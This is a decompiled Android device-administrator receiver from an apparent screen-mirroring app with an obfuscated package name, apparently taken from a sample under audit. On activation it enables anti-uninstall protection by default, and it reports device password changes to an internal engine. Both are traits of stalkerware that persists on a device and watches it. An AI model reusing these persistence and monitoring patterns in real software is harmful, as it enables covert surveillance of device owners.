// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package lyr.stable.runtime;

import android.app.admin.DeviceAdminReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.util.Log;
import com.os9sp.yfwkcq0dwfxaf.R;
import lyr.stable.runtime.engine.EngineService;
import w1.m;
import w1.n;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public class ScreenMirrorAdminReceiver extends DeviceAdminReceiver {
    public static ComponentName a(Context context) {
        return new ComponentName(context.getApplicationContext(), (Class<?>) ScreenMirrorAdminReceiver.class);
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final CharSequence onDisableRequested(Context context, Intent intent) {
        return context.getString(R.string.device_admin_disable_warning);
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onDisabled(Context context, Intent intent) {
        Log.w("ScreenMirror", "[DO] device admin disabled");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onEnabled(Context context, Intent intent) {
        Log.i("ScreenMirror", "[DO] device admin enabled");
        EngineService.e("admin_enabled");
        if (context.getSharedPreferences("device_admin", 0).getBoolean("anti_uninstall", true) && n.G(context) && n.D(context)) {
            n.b(context, true);
        }
        if (n.G(context)) {
            m mVarC = m.c(context);
            mVarC.getClass();
            mVarC.f(7, n.r());
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordChanged(Context context, Intent intent, UserHandle userHandle) {
        Log.i("ScreenMirror", "[DO] onPasswordChanged user=" + userHandle);
        m mVarC = m.c(context);
        mVarC.getClass();
        mVarC.f(8, n.h0("device-admin"));
    }
}
